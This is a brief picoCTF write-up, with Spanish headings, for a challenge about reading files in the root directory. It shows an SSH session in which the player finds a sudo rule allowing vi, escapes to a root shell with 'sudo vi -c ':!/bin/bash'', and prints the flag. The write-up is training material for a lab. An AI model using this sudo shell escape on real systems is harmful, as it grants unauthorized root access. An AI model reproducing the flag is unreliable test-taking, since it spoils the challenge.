## Descripcion
Can you read files in the root file?
## Solucion

```
celeh127-academy@webshell:~$ ssh -p 60311 picoplayer@saturn.picoctf.net
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.17.0-1019-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sat Aug 29 22:04:35 2026 from 3.140.102.47
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ sudo vi -c ':!/bin/bash' /dev/null

root@challenge:/home/picoplayer# cd /root
root@challenge:~# ls -la
total 16
drwx------ 1 root root   22 Aug 29 22:07 .
drwxr-xr-x 1 root root   63 Aug 29 22:04 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root  533 Aug 29 22:07 .viminfo
root@challenge:~# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}
```
## Notas adicionales
## Referencias
